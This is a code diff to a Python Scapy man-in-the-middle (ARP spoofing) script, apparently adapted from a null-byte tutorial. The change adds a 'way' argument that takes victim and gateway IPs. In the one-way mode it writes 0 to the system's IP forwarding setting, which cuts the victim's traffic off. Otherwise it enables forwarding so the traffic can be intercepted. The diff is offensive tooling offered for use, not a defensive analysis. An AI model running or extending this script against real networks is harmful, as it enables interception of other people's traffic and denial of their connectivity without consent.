@@ -1,3 +1,4 @@
+# https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/
 from scapy.all import *
 import sys
 import os
@@ -9,18 +10,25 @@ try:
         parser.add_argument('interface', help="Network interface to listen on i.e. en0", type=str)
         parser.add_argument('victim_ip', help="Capture X packets and exit", type=str)
         parser.add_argument('gate_ip', help="Capture X packets and exit", type=str)
+        parser.add_argument('way', help="Specify 1 way or 2 way attack", type=str)
         args=parser.parse_args()
 
         interface = args.interface
         victim_ip = args.victim_ip
         gate_ip = args.gate_ip
+        attack_way = args.way
+
 except KeyboardInterrupt:
         print("\nUser Requested Shutdown")
         print("Exiting...")
         sys.exit(1)
  
-print("\nEnabling IP Forwarding...\n")
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+if attack_way == '1':
+        print("\nPreventing IP Forwarding...\n")
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+else:
+        print("\nEnabling IP Forwarding...\n")
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
  
 def get_mac(IP):
         conf.verb = 0
